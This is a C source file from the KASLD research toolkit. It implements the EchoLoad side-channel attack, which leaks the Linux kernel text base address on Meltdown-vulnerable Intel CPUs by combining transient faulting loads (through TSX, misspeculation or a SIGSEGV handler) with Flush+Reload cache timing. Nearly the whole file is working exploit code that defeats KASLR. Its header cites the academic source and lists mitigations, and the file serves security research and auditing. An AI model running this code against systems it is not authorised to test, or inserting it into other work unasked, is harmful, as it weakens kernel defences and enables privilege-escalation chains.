// This file is part of KASLD - https://github.com/bcoles/kasld
//
// EchoLoad side-channel KASLR bypass.
//
// Exploits the fact that on Meltdown-vulnerable Intel CPUs, a faulting
// load to a kernel address returns zero (rather than stalling) when the
// permission check fails. By encoding that zero into a Flush+Reload
// probe array, we can distinguish mapped kernel pages from unmapped ones:
// mapped pages return zero (cache hit on probe[0]); unmapped pages stall
// and produce no cache fill.
//
// Three transient execution modes are supported (compile-time selection):
//   - TSX abort:     Most reliable. Requires CPUID RTM bit (Intel TSX).
//   - Speculation:   Uses misspeculation via ret-to-call gadget. Works
//                    without TSX but slower and noisier, especially in VMs.
//   - Signal handler: Uses SIGSEGV + setjmp/longjmp. Fallback.
//
// The attack probes the 1 GiB kernel text window in 2 MiB steps. On
// vulnerable hardware with KPTI enabled, the lowest confirmed address is
// typically __entry_text_start; with KPTI disabled, it is _stext.
//
// On non-vulnerable hardware (AMD CPUs, modern Intel with in-silicon
// Meltdown fix), the transient load stalls rather than returning zero,
// so no cache line is filled and no result is produced. The component
// exits cleanly with no output — no false positives.
//
// Technique by Claudio Canella, Michael Schwarz, Martin Haubenwallner,
// Martin Schwarzl, and Daniel Gruss:
// "KASLR: Break It, Fix It, Repeat" (Asia CCS 2020)
//
// Leak primitive:
//   Data leaked:      kernel text virtual base address
//   Kernel subsystem: arch/x86 — Meltdown zero-return transient execution
//   Data structure:   kernel text mapping (faulting load returns zero)
//   Address type:     virtual (kernel text)
//   Method:           timing (Flush+Reload on probe array)
//   Status:           unfixed on Meltdown-vulnerable hardware
//   Access check:     N/A (hardware side-channel — no kernel gate)
//   Source:           N/A (hardware side-channel)
//
// Mitigations:
//   Non-Meltdown hardware (all AMD CPUs, Intel Ice Lake+) is immune —
//   the transient load stalls instead of returning zero. TSX disabled
//   (microcode or CONFIG_X86_INTEL_TSX_MODE_OFF) blocks the most
//   reliable mode but signal-handler mode still works. KPTI does not
//   fully mitigate (zero-return still distinguishes mapped vs unmapped).
//
// References:
// https://cc0x1f.net/publications/kaslr.pdf
// https://github.com/cc0x1f/store-to-leak-forwarding-there-and-back-again
// https://i.blackhat.com/asia-20/Friday/asia-20-Canella-Store-To-Leak-Forwarding-There-And-Back-Again-wp.pdf
// ---
// <bcoles@gmail.com>

#if !defined(__x86_64__) && !defined(__amd64__)
#error "Architecture is not supported"
#endif

#define _GNU_SOURCE
#include "include/kasld.h"
#include "include/kasld_internal.h"
#include "include/sidechannel.h"
#include <memory.h>
#include <setjmp.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>

/* =========================================================================
 * Configuration
 * =========================================================================
 */

/* Transient execution mode (select exactly one).
 *
 * TSX abort mode is the default. Falls back to signal handler mode if
 * the CPU lacks RTM support, so it is safe to leave TSX enabled.
 */
#define ECHOLOAD_USE_TSX 1
#define ECHOLOAD_USE_SPECULATION 0
#define ECHOLOAD_USE_SIGNAL 0

/* Number of interleaved iterations over the full scan window. Each
 * address is probed once per iteration, and cache hits are accumulated.
 *
 * Uses the same statistical approach as entrybleed: many interleaved
 * iterations to smooth noise, followed by unanimity verification.
 * Flush+Reload is self-resetting (clflush at the end of each probe),
 * so repeated iterations do not accumulate cache state. */
#define ECHOLOAD_ITERATIONS 100
#define ECHOLOAD_WARMUP 5

/* Minimum number of cache hits (out of ECHOLOAD_ITERATIONS) for an
 * address to be considered mapped. On Meltdown-vulnerable CPUs, mapped
 * kernel pages typically produce hit rates of 80-100%; noise on
 * non-vulnerable CPUs produces <5%. */
#define ECHOLOAD_HIT_THRESHOLD 50

/* Number of verification sweeps. The initial sweep result must match
 * all verification sweeps exactly (entrybleed-style unanimity check). */
#define ECHOLOAD_VERIFY 3

/* Scan window: uses kasld.h defines (KERNEL_BASE_MIN, KERNEL_BASE_MAX). */
#define SCAN_STEP (KERNEL_ALIGN)
#define SCAN_SLOTS                                                             \
  ((unsigned long)(KERNEL_BASE_MAX - KERNEL_BASE_MIN) / SCAN_STEP)

KASLD_EXPLAIN("EchoLoad exploits the Meltdown vulnerability's zero-return "
              "behavior: on affected Intel CPUs, a speculative kernel memory "
              "read that faults returns zero to the transient execution path, "
              "but only for mapped pages. By using Flush+Reload to detect "
              "whether the speculative load produced a zero byte, the attack "
              "distinguishes mapped from unmapped kernel pages, revealing the "
              "KASLR text base. Requires Meltdown-vulnerable hardware (pre-Ice "
              "Lake Intel);.");

KASLD_META("method:timing\n"
           "phase:probing\n"
           "addr:virtual\n"
           "status:experimental\n"
           "hardware:Meltdown-vulnerable CPU required\n");

/* =========================================================================
 * Fault suppression
 * =========================================================================
 */

/* --- Signal-based (SIGSEGV + longjmp) --- */
static jmp_buf trycatch_buf;

static void segfault_handler(int signum) {
  (void)signum;
  sigset_t sigs;
  sigemptyset(&sigs);
  sigaddset(&sigs, SIGSEGV);
  sigprocmask(SIG_UNBLOCK, &sigs, NULL);
  longjmp(trycatch_buf, 1);
}

/* --- Speculation (ret-to-call mispredict) --- */
#if ECHOLOAD_USE_SPECULATION
#define speculation_start(label) __asm__ goto("call %l0" : : : : label##_retp)
#define speculation_end(label)                                                 \
  __asm__ goto("jmp %l0" : : : : label);                                       \
  label##_retp : __asm__ goto("lea %l0(%%rip), %%rax\n\tmovq %%rax, "          \
                              "(%%rsp)\n\tret" : : : "rax" : label);           \
  label:                                                                       \
  __asm__ volatile("nop")
#endif

/* =========================================================================
 * EchoLoad single sweep
 * =========================================================================
 *
 * Scans [KERNEL_BASE_MIN, KERNEL_BASE_MAX) and returns the lowest
 * confirmed mapped address, or 0 if nothing was found.
 *
 * Uses interleaved iteration: visit every candidate address once per
 * iteration, repeat ECHOLOAD_ITERATIONS times, and accumulate per-slot
 * hit counts. This avoids branch predictor training from repeated
 * sequential probes at the same address.
 */
static unsigned long echoload_sweep(int use_tsx) {
  int hits[SCAN_SLOTS];
  memset(hits, 0, sizeof(hits));

  for (int iter = 0; iter < ECHOLOAD_ITERATIONS + ECHOLOAD_WARMUP; iter++) {
    volatile char *buffer = (volatile char *)KERNEL_BASE_MIN;

    for (unsigned long slot = 0; slot < SCAN_SLOTS; slot++) {
      flush(probe);

      if (use_tsx) {
        /* TSX abort mode */
        if (xbegin_wrapper() == ~0u) {
          maccess(0);
          maccess(probe + *(volatile char *)buffer);
          xend_wrapper();
        }
      }
#if ECHOLOAD_USE_SPECULATION
      else {
        /* Speculation mode */
        speculation_start(s);
        {
          maccess(0);
          maccess(probe + *(volatile char *)buffer);
        }
        speculation_end(s);
      }
#else
      else {
        /* Signal handler mode */
        if (!setjmp(trycatch_buf)) {
          maccess(0);
          maccess(probe + *(volatile char *)buffer);
        }
      }
#endif

      if (iter >= ECHOLOAD_WARMUP && flush_reload(probe))
        hits[slot]++;

      buffer += SCAN_STEP;
    }
  }

  /* Return the lowest address above the hit threshold */
  for (unsigned long slot = 0; slot < SCAN_SLOTS; slot++) {
    if (hits[slot] >= ECHOLOAD_HIT_THRESHOLD)
      return KERNEL_BASE_MIN + slot * SCAN_STEP;
  }
  return 0;
}

/* =========================================================================
 * main
 * =========================================================================
 */
int main(void) {
  if (!getenv("KASLD_EXPERIMENTAL")) {
    fprintf(stderr, "[-] echoload: experimental component; "
                    "set KASLD_EXPERIMENTAL=1 to enable\n");
    return KASLD_EXIT_UNAVAILABLE;
  }

  if (!is_intel_cpu()) {
    fprintf(stderr, "[-] echoload: not an Intel CPU; attack not applicable\n");
    return KASLD_EXIT_UNAVAILABLE;
  }

  int use_tsx;

#if ECHOLOAD_USE_TSX
  use_tsx = has_rtm();
  if (use_tsx) {
    fprintf(stderr, "[.] echoload: using TSX abort mode\n");
  } else {
    fprintf(stderr,
            "[.] echoload: TSX not available, falling back to %s mode\n",
#if ECHOLOAD_USE_SPECULATION
            "speculation"
#else
            "signal handler"
#endif
    );
  }
#else
  use_tsx = 0;
  fprintf(stderr, "[.] echoload: using %s mode\n",
#if ECHOLOAD_USE_SPECULATION
          "speculation"
#else
          "signal handler"
#endif
  );
#endif

  if (!use_tsx) {
    signal(SIGSEGV, segfault_handler);
  }

  memset(probe, 1, sizeof(probe));

  cache_miss_threshold = detect_flush_reload_threshold();
  fprintf(stderr, "[.] echoload: cache miss threshold: %zu cycles\n",
          cache_miss_threshold);

  /* Pin to a single core to reduce noise */
  pin_cpu(1);

  unsigned long addr = echoload_sweep(use_tsx);

  if (!addr) {
    fprintf(stderr, "[-] echoload: no kernel mapping detected "
                    "(CPU may not be vulnerable)\n");
    return 0;
  }

  /* Unanimity verification: repeat the full sweep and require every result to
   * match. If any sweep disagrees, the result is rejected entirely. */
  for (int v = 0; v < ECHOLOAD_VERIFY; v++) {
    if (addr != echoload_sweep(use_tsx)) {
      fprintf(stderr, "[-] echoload: inconsistent results. Aborting ...\n");
      return 0;
    }
  }

  /* The leaked address is the start of the kernel entry trampoline if
   * KPTI is active (__entry_text_start, the cpu_entry_area trampoline)
   * or _stext otherwise — both are well-known kernel text symbols. */
  bool pti = detect_kpti();
  const char *symbol = pti ? "__entry_text_start" : "_stext";

  fprintf(stderr, "[+] echoload: %s = 0x%016lx\n", symbol, addr);
  kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_TEXT, addr,
               KASLD_REGION_KERNEL_TEXT, symbol);

  return 0;
}
